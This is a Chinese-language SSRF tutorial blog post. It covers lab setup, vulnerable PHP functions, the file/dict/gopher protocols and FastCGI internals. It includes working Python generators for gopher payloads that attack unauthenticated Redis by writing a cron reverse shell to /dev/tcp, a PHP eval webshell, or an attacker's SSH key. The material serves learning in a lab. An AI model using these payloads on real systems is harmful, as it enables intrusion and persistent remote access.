# 学习一年的SSRF总结

阅读量 **350474**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2022-01-13 10:00:08

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t01eb9a2859b82438aa.png)

## SSRF-Labs配置

有些初学者喜欢用这个靶场，讲下怎么搭建

我用的是Ubuntu18；docker和docker-compose配置可以参考[vulhub官网](https://vulhub.org/#/docs/)的配置；下面是谷歌搜的

    
    
    $ curl -sSL https://get.docker.com/ | sh #脚本安装docker
    $ apt install docker-compose #安装docker compose
    

Basic关和其他关类似，都有Dockerfile文件，按下图指令参考就好了

    
    
    $ cd ~/ssrf-lab/basics #进入basics文件夹
    $ docker build -t ssrf-lab/basic . #构建镜像
    $ docker run -d -p 8999:80 ssrf-lab/basic #创建容器
    $ docker ps #查看ssrf-lab/basic容器编号
    $ docker stop [容器编号] #关闭容器
    

查看源码，进入容器的命令如下

    
    
    $ sudo docker ps  
    $ sudo docker exec -it 编号 /bin/bash
    

在Advances系列、Ctf系列中没有dockerfile文件，但有docker-compose.yml文件，这时候我们就要在构建镜像的时候就换docker-compose来创建镜像并开启容器了。例如

    
    
    $ cd ~/ssrf-lab/advanced1 # 进入advanced1目录下
    $ docker-compose up -d #开启容器
    $ docker-compose down #关闭容器
    

平常也得按时清理：

    
    
    docker rm $(docker ps -a -q)
    docker rmi $(docker images -q)
    #第一个是删除所有容器 第二个是删除所有镜像
    

## 基础

###  相关函数和类

**File_Get_Contents**

    
    
    // ssrf.php
    <?php
    $url = $_GET['url'];;
    echo file_get_contents($url);
    ?>
    

上述测试代码中，file_get_contents()
函数将整个文件或一个url所指向的文件读入一个字符串中，并展示给用户，我们构造类似`ssrf.php?url=../../../../../etc/passwd`的paylaod即可读取服务器本地的任意文件。

![](https://p1.ssl.qhimg.com/t0158f43ebd2bbc87c4.png)

readfile()函数与file_get_contents()函数相似。

**Fsockopen()**

`fsockopen($hostname,$port,$errno,$errstr,$timeout)`用于打开一个网络连接或者一个Unix
套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。
fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false。

PS:上过C的网络编程应该很清楚

    
    
    // ssrf.php
    <?php
    $host=$_GET['url'];
    $fp = fsockopen($host, 80, $errno, $errstr, 30);
    if (!$fp) {
        echo "$errstr ($errno)<br />\n";
    } else {
        $out = "GET / HTTP/1.1\r\n";
        $out .= "Host: $host\r\n";
        $out .= "Connection: Close\r\n\r\n";
        fwrite($fp, $out);
        while (!feof($fp)) {
            echo fgets($fp, 128);
        }
        fclose($fp);
    }
    ?>
    

构造`ssrf.php?url=www.baidu.com`即可成功触发ssrf并返回百度主页：

![](https://p4.ssl.qhimg.com/t01303faea0323d19bd.png)

**Curl_exec()**

curl_init(url)函数初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close()
函数使用。

    
    
    // ssrf.php
    <?php 
    if (isset($_GET['url'])){
        $link = $_GET['url'];
        $curlobj = curl_init(); // 创建新的 cURL 资源
        curl_setopt($curlobj, CURLOPT_POST, 0);
        curl_setopt($curlobj,CURLOPT_URL,$link);
        curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); // 设置 URL 和相应的选项
        $result=curl_exec($curlobj); // 抓取 URL 并把它传递给浏览器
        curl_close($curlobj); // 关闭 cURL 资源，并且释放系统资源
    
        // $filename = './curled/'.rand().'.txt';
        // file_put_contents($filename, $result); 
        echo $result;
    }
    ?>
    

构造`ssrf.php?url=www.baidu.com`即可成功触发ssrf并返回百度主页：

![](https://p4.ssl.qhimg.com/t018f6396114e07004b.png)

**SoapClient**

SOAP是简单对象访问协议，简单对象访问协议（SOAP）是一种轻量的、简单的、基于 XML 的协议，它被设计成在 WEB 上交换结构化的和固化的信息。PHP
的 SoapClient 就是可以基于SOAP协议可专门用来访问 WEB 服务的 PHP 客户端。

SoapClient是一个php的内置类，当其进行反序列化时，如果触发了该类中的`__call`方法，那么`__call`便方法可以发送HTTP和HTTPS请求。该类的构造函数如下：

    
    
    public SoapClient :: SoapClient(mixed $wsdl [，array $options ])
    

  * 第一个参数是用来指明是否是wsdl模式。
  * 第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而 uri 是SOAP服务的目标命名空间。

知道上述两个参数的含义后，就很容易构造出SSRF的利用Payload了。我们可以设置第一个参数为null，然后第二个参数为一个包含location和uri的数组，location选项的值设置为target_url：

    
    
    // ssrf.php<?php$a = new SoapClient(null,array('uri'=>'http://47.xxx.xxx.72:2333', 'location'=>'http://47.xxx.xxx.72:2333/aaa'));$b = serialize($a);echo $b;$c = unserialize($b);$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf?>
    

47.xxx.xxx.72监听2333端口，访问ssrf.php，即可在47.xxx.xxx.72上得到访问的数据：

![](https://p1.ssl.qhimg.com/t014812ff5c13729683.png)

如上图所示，ssrf触发成功。

由于它仅限于http/https协议，所以用处不是很大。但是如果这里的http头部还存在crlf漏洞，那么我们就可以进行ssrf+crlf，注入或修改一些http请求头。见[详情](https://www.anquanke.com/post/id/202025)

###  SSRF漏洞利用的相关协议

SSRF漏洞的利用所涉及的协议有：

  * file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容
  * dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等
  * gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell
  * http/s协议：探测内网主机存活

**_以这俩文件为本章的实验文件_**

![](https://p2.ssl.qhimg.com/t01a4d49ffff2ce16c9.png)

###  File协议

读取本地文件用的

![](https://p3.ssl.qhimg.com/t015791ffa32f57006b.png)

###  HTTP协议

探测一下内网活着的主机（但是很多不会开Http协议，没多大用）

抓一下包，丢BP里面探测一下就行（我自己靶场没写那逻辑，写个思路就行）

![](https://p4.ssl.qhimg.com/t01fb96aa290da258b2.png)

![](https://p0.ssl.qhimg.com/t01c70caac09a4d74c9.png)

###  Dict协议

结合端口探测内网服务

比如看看Mysql（这个是需要授权导致的错误，后面会讲）

![](https://p3.ssl.qhimg.com/t01ea8507d10e7bf2e7.png)

看看Redis（未授权访问成功的样子）

![](https://p3.ssl.qhimg.com/t01cdd19ecc932cdf1b.png)

###  Gopher协议

**定义**

Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；

>
> gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议

**限制**

gopher协议在各个编程语言中的使用限制

![](https://p2.ssl.qhimg.com/t01b1534a77fdaf4b88.png)

> —wite-curlwrappers选项含义：运用curl工具打开url流  
>  curl使用curl —version查看版本以及支持的协议

![](https://p1.ssl.qhimg.com/t013d310f710f78e62e.png)

Curl的所需参数是一个URL，即URLEncode后的链接（重点）

**格式**

> gopher://<host>:<port>/<gopher-path>_后接TCP数据流

  * gopher的默认端口是70
  * 如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&也需要进行URL编码（详细注意事项见下）

**Gopher发送Get请求**

> 1、问号（？）需要转码为URL编码，也就是%3f  
>  2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a  
>  3、在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）

可能还没明白:sweat_smile:，写了个脚本直接转换，结果直接复制到BP即可；data是你的报文

    
    
    import reimport urllib.parsedata=\    '''GET /try.php?a=Wan&b=Zifeng HTTP/1.1Host: 192.168.0.130:8201Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close'''data=urllib.parse.quote(data)strinfo=re.compile('%0A',re.I)new=strinfo.sub('%0D%0A',data)new='gopher://192.168.0.130:8201/_'+new+'%0D%0A'new=urllib.parse.quote(new)with open('Result.txt','w') as f:    f.write(new)with open('Result.txt','r') as f:    for line in f.readlines():        print(line.strip())
    

![](https://p3.ssl.qhimg.com/t0152387ebb9ce9daf4.png)

因为BP是抓取浏览器URLEncode编码后的数据，所以我们得对整个gopher协议进行二次编码

这样到达服务器一次解码得到的就是

>
> gopher://192.168.0.130:8201/_GET%20/try.php%3Fa%3DWan%26b%3DZifeng%20HTTP/1.1%0D%0AHost%3A%20192.168.0.130%3A8201%0D%0ACache-> Control%3A%20max-age%3D0%0D%0AUpgrade-Insecure-Requests%3A%201%0D%0AUser-> Agent%3A%20Mozilla/5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20×64%29%20AppleWebKit/537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome/92.0.4515.159%20Safari/537.36%0D%0AAccept%3A%20text/html%2Capplication/xhtml%2Bxml%2Capplication/xml%3Bq%3D0.9%2Cimage/avif%2Cimage/webp%2Cimage/apng%2C%2A/%2A%3Bq%3D0.8%2Capplication/signed-> exchange%3Bv%3Db3%3Bq%3D0.9%0D%0AAccept-> Encoding%3A%20gzip%2C%20deflate%0D%0AAccept-Language%3A%20zh-> CN%2Czh%3Bq%3D0.9%0D%0AConnection%3A%20close%0D%0A

这样就是可以正常解析的URL（Gopher发送的TCP数据流要求是URLEncode后的，毕竟是伪协议嘛），丢给Curl函数执行完事

**Gopher发送POST请求**

和GET请求一样，放入脚本编码后即可放到URL中

![](https://p1.ssl.qhimg.com/t016606d3e659c8ebc3.png)

如果改成了POST格式捏？

![](https://p2.ssl.qhimg.com/t01a17fe54c427cbc82.png)

如果是Content-type为application/x-www-form-urlencoded，那么POST数据也应进行二次编码（该选项含义就是URL编码后的数据）

![](https://p5.ssl.qhimg.com/t01e3a28f6f0d09c47f.png)

form-data的话就不需要

**使用注意事项**

  * 大部分 PHP 并不会开启 fopen 的 gopher wrapper
  * file_get_contents 的 gopher 协议不能 URLencode
  * file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败
  * PHP 的 curl 默认不 follow 302 跳转
  * curl/libcurl 7.43 上 gopher 协议存在 bug（%00 截断），经测试 7.49 可用

## Redis未授权攻击

概念如下

> Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将
> Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis
> 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config
> 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的 authotrized_keys
> 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。
>
> 简单说，漏洞的产生条件有以下两点：
>
>   * redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。
>   * 没有设置密码认证（默认为空），可以免密码远程登录redis服务。
>

在SSRF漏洞中，如果通过端口扫描等方法发现目标主机上开放6379端口，则目标主机上很有可能存在Redis服务。此时，如果目标主机上的Redis由于没有设置密码认证、没有进行添加防火墙等原因存在未授权访问漏洞的话，那我们就可以利用Gopher协议远程操纵目标主机上的Redis，可以利用
Redis 自身的提供的 config 命令像目标主机写WebShell、写SSH公钥、创建计划任务反弹Shell等…..

思路都是一样的，就是先将Redis的本地数据库存放目录设置为web目录、~/.ssh目录或/var/spool/cron目录等，然后将dbfilename（本地数据库文件名）设置为文件名你想要写入的文件名称，最后再执行save或bgsave保存，则我们就指定的目录里写入指定的文件了。

###  Redis发送的数据

这个不知道为啥做不出来，嫖了一下图:joy:

有如下环境

> 0.101 攻击者  
>  0.100 redis 服务器  
>  0.104 web 服务器

首先要搞清楚访问 redis 时每次发送的数据是怎样的，所以先用 `socat` 监听 4444 端口，将 redis 的 6379 端口转发至 4444
来监听 gopher 访问 redis 的流量：

    
    
    // redis 服务器执行$ socat -v tcp-listen:4444,fork tcp-connect:192.168.0.100:6379
    

然后在攻击机 `redis-cli` 连接 redis 服务器的 4444 端口，运行一些常见指令，这里 redis 的密码是 123456。

![](https://p4.ssl.qhimg.com/t01860e457bce071f48.png)

命令依次是输入密码、显示所有键，输出 `name` 键的值。

查看 redis 服务器，得到的回显如下：

![](https://p4.ssl.qhimg.com/t01487e5704eb7965d9.png)

那么，如果我们构造 gopher 的 `DATA` 也是这种格式的话，就可以获取到数据。借助 web 服务器利用 SSRF 就可以达到攻击内网 redis
的目的。

但是！实战中最好一次一条指令，url 过长会导致抛出 `UnicodeError: label empty or too long`的异常

> PS：其实我总结一下很简单..:joy_cat:
>
> 每次发的命令字符串都是以空格为分隔符被分成数组，比如auth 123456就变成[‘auth’,’123456’]
>
> 第一行是*+数组长度
>
> 然后就是\$+字符串长度，比如auth长度为四，那么第一行就是\$4，第二行就是auth
>
> 123456长度为六，第一行就是\$6，第二行就是123456

###  攻击：写进定时任务

**必须用Centos起Redis，权限问题；不然无法反弹**

攻击机发送给有SSRF的Win2003，IP见虚拟机环境

主要靠下面几条Redis命令

    
    
    flushallset 1 '\n\n*/1 * * * * bash -i >& /dev/tcp/反弹IP/反弹端口 0>&1\n\n'config set dir /var/spool/cron/config set dbfilename rootsave
    

> 第一条是清空Redis所有数据
>
> 第二条设置键名为1，键值为反弹shell
>
> 第三条设置Redis文件存储目录为Centos下的计划任务目录
>
> 第四条设置Redis存储文件名
>
> 第五条保存设置

根据命令，自写计划任务反弹Shell的py脚本，参数你们都看得懂= =

    
    
    import urllib.parseprotocol="gopher://"ip="192.168.0.129"port="6379"reverse_ip="192.168.0.132"reverse_port="2333"cron="\n\n\n\n*/1 * * * * bash -i >& /dev/tcp/%s/%s 0>&1\n\n\n\n"%(reverse_ip,reverse_port)filename="root"path="/var/spool/cron"passwd=""cmd=["flushall",     "set 1 {}".format(cron.replace(" ","${IFS}")),     "config set dir {}".format(path),     "config set dbfilename {}".format(filename),     "save"     ]if passwd:    cmd.insert(0,"AUTH {}".format(passwd))payload=protocol+ip+":"+port+"/_"def redis_format(arr):    CRLF="\r\n"    redis_arr = arr.split(" ")    cmd=""    cmd+="*"+str(len(redis_arr))    for x in redis_arr:        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")    cmd+=CRLF    return cmdif __name__=="__main__":    for x in cmd:        payload += urllib.parse.quote(redis_format(x))    payload=urllib.parse.quote(payload)    with open('Result.txt','w') as f:        f.write(payload)    with open("Result.txt","r") as f:        for line in f.readlines():            print(line.strip())
    

发送！

![](https://p2.ssl.qhimg.com/t01cf8261dcc5073cd8.png)

Centos就能看见产生了计划任务

![](https://p2.ssl.qhimg.com/t01155bcd64ec19452c.png)

Kali也接收到了反弹Shell

![](https://p5.ssl.qhimg.com/t01a0b615e5a15889f7.png)

URL二次解码后，能看到传过去的命令

![](https://p2.ssl.qhimg.com/t0160eae60030019273.png)

**_第二次虚拟环境_**

**攻击机 192.168.0.128**

**Win_2003 192.168.0.130**

**Centos 192.168.0.141**

**Kali 192.168.0.132**

**Ubuntu 192.168.0.142**

###  攻击：绝对路径写Webshell

当然这个很少见了，开Redis的内网服务器会开Web服务么= =

需要执行的Redis命令如下

    
    
    flushallset 1 '<?php eval($_POST["cmd"]);?>'config set dir /var/www/htmlconfig set dbfilename shell.phpsave
    

然后生成命令的脚本

    
    
    import urllib.parseprotocol="gopher://"ip="192.168.0.141"port="6379"shell="\n\n<?php eval($_POST[\"cmd\"]);?>\n\n"filename="shell.php"path="/var/www/"passwd=""cmd=["flushall",     "set 1 {}".format(shell.replace(" ","${IFS}")),     "config set dir {}".format(path),     "config set dbfilename {}".format(filename),     "save"     ]if passwd:    cmd.insert(0,"AUTH {}".format(passwd))payload=protocol+ip+":"+port+"/_"def redis_format(arr):    CRLF="\r\n"    redis_arr = arr.split(" ")    cmd=""    cmd+="*"+str(len(redis_arr))    for x in redis_arr:        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")    cmd+=CRLF    return cmdif __name__=="__main__":    for x in cmd:        payload += urllib.parse.quote(redis_format(x))    payload=urllib.parse.quote(payload)    with open('Result.txt','w') as f:        f.write(payload)    with open("Result.txt","r") as f:        for line in f.readlines():            print(line.strip())
    

然后发包

![](https://p3.ssl.qhimg.com/t01fed5f8954d0a821a.png)

已经写入了Web目录~

![](https://p3.ssl.qhimg.com/t01ebb255f91e56c271.png)

###  攻击：写入SSH公钥

使用`ssh-keygen -t
rsa`生成公钥和私钥。RSA加密算法就是公钥加密，私钥解密；所以我们要把公钥给服务器，然后用自己私钥登录即可。（如果redis那台服务器没有目录的话一定要想办法生成好，不然会报路径错误）

![](https://p2.ssl.qhimg.com/t0171a41fb205153d74.png)

我们需要执行老样子的Redis命令

    
    
    flushallset 1 '公钥'config set dir /root/.ssh/config set dbfilename authorized_keyssave
    

还是老样子的脚本

    
    
    import urllib.parseprotocol="gopher://"ip="192.168.0.141"port="6379"ssh_pub="ssh-rsa AAAAB3NzaC1yc2EAAAADAQ"+\    "ABAAABAQC8YIKqm8JZRdoi2FCY97+fNp+lT"+\    "CEwoPPoBGOKLLWYeeKsm3gRNy7kmHx1IHhsm"+\    "yIknEcbQCciBx41Ln+1SIbEqYVFksHNxk8xG"+\    "iaxjsUOYATqQ1Lkq/ZMxKAzpq08uGp17URbJmv3JtuKEkHPdEHDqvBQJLUVJCCvAm86Yer8y663BFxRv5AXwSkCYquL"+\    "P7XvG6yyYATdoRPJCdqjTtsGIlpJOH4gMfEhZOxKsLzwZJIWYose2BEA1REM7Nfxx2Oqva/hSErf5RqXgXXSWC3/jBlz"+\    "P2xof1a4CDRL9LoKLLTwUFQKWSMfnjMKYH3+uZIg4MyUAdWWwubEhpS6lpJd wzf@wzf-virtual-machine"filename="authorized_keys"path="/root/.ssh/"passwd=""cmd=["flushall",     "set 1 {}".format(ssh_pub.replace(" ","${IFS}")),     "config set dir {}".format(path),     "config set dbfilename {}".format(filename),     "save"     ]if passwd:    cmd.insert(0,"AUTH {}".format(passwd))payload=protocol+ip+":"+port+"/_"def redis_format(arr):    CRLF="\r\n"    redis_arr = arr.split(" ")    cmd=""    cmd+="*"+str(len(redis_arr))    for x in redis_arr:        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")    cmd+=CRLF    return cmdif __name__=="__main__":    for x in cmd:        payload += urllib.parse.quote(redis_format(x))    payload=urllib.parse.quote(payload)    with open('Result.txt','w') as f:        f.write(payload)    with open("Result.txt","r") as f:        for line in f.readlines():            print(line.strip())
    

出现这个就说明写入成功了

![](https://p1.ssl.qhimg.com/t0174dd23415bdc7d6d.png)

然后SSH连接即可

## FAST-CGI攻击

###  CGI

Apache和PHP有很多交互方式，主要有module、cgi和fastcgi模式三种

CGI模式下，此时 php 是一个独立的进程比如 php-cgi.exe，web 服务器也是一个独立的进程比如 apache.exe，然后当 Web
服务器监听到 HTTP 请求时，会去调用 php-cgi 进程，他们之间通过 cgi 协议，服务器把请求内容转换成 php-cgi 能读懂的协议数据传递给
cgi 进程，cgi 进程拿到内容就会去解析对应 php 文件，得到的返回结果在返回给 web 服务器，最后 web
服务器返回到客户端，但随着网络技术的发展，CGI 方式的缺点也越来越突出。每次客户端请求都需要建立和销毁进程。因为 HTTP
要生成一个动态页面，系统就必须启动一个新的进程以运行 CGI 程序，不断地 fork 是一项很消耗时间和资源的工作。

###  FASTCGI

**概述**

fastcgi 本身是一个协议，在 cgi 协议上进行了一些优化，众所周知，CGI 进程的反复加载是 CGI 性能低下的主要原因，如果 CGI
解释器保持在内存中 并接受 FastCGI 进程管理器调度，则可以提供良好的性能、伸缩性、Fail-Over 特性等等。 简而言之，CGI 模式是
apache2 接收到请求去调用 CGI 程序，而 fastcgi 模式是 fastcgi 进程自己管理自己的 cgi 进程，而不再是 apache
去主动调用 php-cgi，而 fastcgi 进程又提供了很多辅助功能比如内存管理，垃圾处理，保障了 cgi 的高效性，并且 CGI
此时是常驻在内存中，不会每次请求重新启动

**FastCGI Record**

Fastcgi其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。

HTTP协议是浏览器和服务器中间件进行数据交换的协议，浏览器将HTTP头和HTTP体用某个规则组装成数据包，以TCP的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以HTTP协议的规则打包返回给服务器。

类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。

和HTTP头不同，record的头固定8个字节，body是由头中的contentLength指定，其结构如下：

    
    
    typedef struct {      /* Header */      unsigned char version; // 版本      unsigned char type; // 本次record的类型      unsigned char requestIdB1; // 本次record对应的请求id      unsigned char requestIdB0;  unsigned char contentLengthB1; // body体的大小      unsigned char contentLengthB0;  unsigned char paddingLength; // 额外块大小      unsigned char reserved;       /* Body */      unsigned char contentData[contentLength];      unsigned char paddingData[paddingLength];} FCGI_Record;
    

头由8个uchar类型的变量组成，每个变量1字节。其中，`requestId`占两个字节，一个唯一的标志id，以避免多个请求之间的影响；`contentLength`占两个字节，表示body的大小。

语言端解析了fastcgi头以后，拿到`contentLength`，然后再在TCP流里读取大小等于`contentLength`的数据，这就是body体。

Body后面还有一段额外的数据（Padding），其长度由头中的paddingLength指定，起保留作用。不需要该Padding的时候，将其长度设置为0即可。

可见，一个fastcgi record结构最大支持的body大小是2^16^，也就是65536字节

**FastCGI Type**

`Type`就是指定该record的作用。因为fastcgi一个record的大小是有限的，作用也是单一的，所以我们需要在一个TCP流里传输多个record。通过`type`来标志每个record的作用，用`requestId`作为同一次请求的id。

也就是说，每次请求，会有多个record，他们的`requestId`是相同的。

借用[该文章](http://blog.csdn.net/shreck66/article/details/50355729)中的一个表格，列出最主要的几种`type`（其他杂七杂八的上网查吧）：

type值 | 主要含义  
---|---  
1 | 在与php-fpm建立连接之后发送的第一个消息中的type值就得为1，用来表明此消息为请求开始的第一个消息  
2 | 异常断开与php-fpm的交互  
3 | 在与php-fpm交互中所发的最后一个消息中type值为此，以表明交互的正常结束  
4 | 在交互过程中给php-fpm传递环境参数时，将type设为此，以表明消息中包含的数据为某个name-value对  
5 | web服务器将从浏览器接收到的POST请求数据(表单提交等)以消息的形式发给php-fpm,这种消息的type就得设为5  
6 | php-fpm给web服务器回的正常响应消息的type就设为6  
7 | php-fpm给web服务器回的错误响应设为7  
  
看了这个表格就很清楚了，服务器中间件和后端语言通信，第一个数据包就是`type`为1的record，后续互相交流，发送`type`为4、5、6、7的record，结束时发送`type`为2、3的record。

当后端语言接收到一个`type`为4的record后，就会把这个record的body按照对应的结构解析成key-value对，这就是环境变量。环境变量的结构如下：

    
    
    typedef struct {      unsigned char nameLengthB0;  /* nameLengthB0  >> 7 == 0 */      unsigned char valueLengthB0; /* valueLengthB0 >> 7 == 0 */     unsigned char nameData[nameLength];      unsigned char valueData[valueLength];} FCGI_NameValuePair11;typedef struct {      unsigned char nameLengthB0;  /* nameLengthB0  >> 7 == 0 */      unsigned char valueLengthB3; /* valueLengthB3 >> 7 == 1 */      unsigned char valueLengthB2;      unsigned char valueLengthB1;      unsigned char valueLengthB0;      unsigned char nameData[nameLength];      unsigned char valueData[valueLength          ((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0];} FCGI_NameValuePair14;typedef struct {      unsigned char nameLengthB3;  /* nameLengthB3  >> 7 == 1 */      unsigned char nameLengthB2;      unsigned char nameLengthB1;     unsigned char nameLengthB0;      unsigned char valueLengthB0; /* valueLengthB0 >> 7 == 0 */      unsigned char nameData[nameLength          ((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0];      unsigned char valueData[valueLength];} FCGI_NameValuePair41;typedef struct {      unsigned char nameLengthB3;  /* nameLengthB3  >> 7 == 1 */      unsigned char nameLengthB2;      unsigned char nameLengthB1;     unsigned char nameLengthB0;      unsigned char valueLengthB3; /* valueLengthB3 >> 7 == 1 */      unsigned char valueLengthB2;      unsigned char valueLengthB1;      unsigned char valueLengthB0;      unsigned char nameData[nameLength          ((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0];      unsigned char valueData[valueLength          ((B3 & 0x7f) << 24) + (B2 << 16) + (B1 << 8) + B0];} FCGI_NameValuePair44;
    

这其实是4个结构，至于用哪个结构，有如下规则：

  1. key、value均小于128字节，用`FCGI_NameValuePair11`
  2. key大于128字节，value小于128字节，用`FCGI_NameValuePair41`
  3. key小于128字节，value大于128字节，用`FCGI_NameValuePair14`
  4. key、value均大于128字节，用`FCGI_NameValuePair44`

为什么我只介绍`type`为4的record？因为环境变量在后面PHP-FPM里有重要作用，之后写代码也会写到这个结构。`type`的其他情况，看官方文档吧。

###  PHP-FPM（Fast-CGI进程管理器）

**概述**

（其实下图的PHP解释器是狭义上的，意为“解释PHP”，而非解释器；真正的存在于PHP-CGI）

![](https://p3.ssl.qhimg.com/t014b848678b2b00013.png)

php-fpm 是一个实现和管理 fastcgi 协议的进程，fastcgi 模式的内存管理等功能，都是由 php-fpm 进程所实现的；本质上
fastcgi 模式也只是对 cgi 模式做了一个封装，只是从原来 web 服务器去调用 cgi 程序变成了 web 服务器通知 php-fpm 进程并由
php-fpm 进程去调用 php-cgi 程序。

也就是说，FPM其实是一个fastcgi协议解析器，Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给FPM，FPM按照fastcgi的协议将TCP流解析成真正的数据。

举个例子，用户访问`http://127.0.0.1/index.php?a=1&b=2`，如果web目录是`/var/www/html`，那么Nginx会将这个请求变成如下key-value对：

    
    
    {    'GATEWAY_INTERFACE': 'FastCGI/1.0',    'REQUEST_METHOD': 'GET',    'SCRIPT_FILENAME': '/var/www/html/index.php',    'SCRIPT_NAME': '/index.php',    'QUERY_STRING': '?a=1&b=2',    'REQUEST_URI': '/index.php?a=1&b=2',    'DOCUMENT_ROOT': '/var/www/html',    'SERVER_SOFTWARE': 'php/fcgiclient',    'REMOTE_ADDR': '127.0.0.1',    'REMOTE_PORT': '12345',    'SERVER_ADDR': '127.0.0.1',    'SERVER_PORT': '80',    'SERVER_NAME': "localhost",    'SERVER_PROTOCOL': 'HTTP/1.1'}
    

这个数组其实就是PHP中`$_SERVER`数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充`$_SERVER`数组，也是告诉fpm：“我要执行哪个PHP文件”。

PHP-FPM拿到fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行`SCRIPT_FILENAME`的值指向的PHP文件，也就是`/var/www/html/index.php`。

**FPM的模式**

> **不同搭建环境配置文件位置不同，最好手工搭建！类似phpstudy和宝塔面板等很多安全选项会进行删割**
>
> **从此处开始均为手动搭建的环境！搭建方法见文末**
>
> **非标注的环境，均为手工搭建**

**TCP 模式**

TCP 模式即是 php-fpm 进程会监听本机上的一个端口(默认 9000)，然后 nginx 会把客户端数据通过 fastcgi 协议传给 9000
端口，php-fpm 拿到数据后会调用 cgi 进程解析

nginx的配置文件像这个样子:

> /etc/nginx/sites-available/default
    
    
    location ~ \.php$ {      index index.php index.html index.htm;      include /etc/nginx/fastcgi_params;      fastcgi_pass 127.0.0.1:9000;      fastcgi_index index.php;      include fastcgi_params; }
    

Windows下的配置如图（PHPstudy弄的）

![](https://p1.ssl.qhimg.com/t0148a2fe98efa1c665.png)

php-fpm 的配置文件像这个样子

> /etc/php/7.3/fpm/pool.d/www.conf
    
    
    listen=127.0.0.1:9000
    

**Unix Socket**

unix socket 其实严格意义上应该叫 unix domain socket，它是 unix
系统进程间通信（IPC）的一种被广泛采用方式，以文件（一般是.sock）作为 socket 的唯一标识（描述符），需要通信的两个进程引用同一个 socket
描述符文件就可以建立通道进行通信了。

具体原理这里就不讲了，但是此通信方式的性能会优于 TCP

> 位置同上
    
    
    location~\.php${      index index.php index.html index.htm;      include /etc/nginx/fastcgi_params;      fastcgi_pass unix:/run/php/php7.3-fpm.sock;      fastcgi_index index.php;      include fastcgi_params;}
    

> 位置同上
    
    
    listen = /run/php/php7.3-fpm.sock
    

###  Nginx和IIS7的解析漏洞

Nginx和IIS7曾经出现过一个PHP相关的解析漏洞，该漏洞现象是，在用户访问`http://127.0.0.1/favicon.ico/.php`时，访问到的文件是favicon.ico，但却按照.php后缀解析了。

用户请求`http://127.0.0.1/favicon.ico/.php`，nginx将会发送如下环境变量到fpm里：

    
    
    {    ...    'SCRIPT_FILENAME': '/var/www/html/favicon.ico/.php',    'SCRIPT_NAME': '/favicon.ico/.php',    'REQUEST_URI': '/favicon.ico/.php',    'DOCUMENT_ROOT': '/var/www/html',    ...}
    

